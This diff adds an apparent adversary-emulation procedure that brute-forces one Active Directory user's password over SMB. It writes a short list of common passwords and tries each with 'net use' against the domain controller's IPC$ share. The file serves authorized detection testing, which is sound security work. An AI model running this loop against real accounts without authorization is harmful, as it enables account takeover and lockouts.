@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: Brute Force Credentials of single Active Directory domain users via SMB
+description: |
+    Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller
+args:
+    - name: user
+      type: string
+      default: '%username%'
+uuid: 09480053-2f98-4854-be6e-71ae5f672224
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.001: Password Guessing'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: brute-force-credentials-of-single-active-directory-domain-users-via-smb
+      inline: |
+        echo Password1> passwords.txt
+        echo 1q2w3e4r>> passwords.txt
+        echo Password!>> passwords.txt
+        echo Spring2022>> passwords.txt
+        echo ChangeMe!>> passwords.txt
+        @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\{{.Args.user}}" "%p" 1>NUL 2>&1 && @echo [*] {{.Args.user}}:%p && @net use /delete %logonserver%\IPC$ > NUL
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
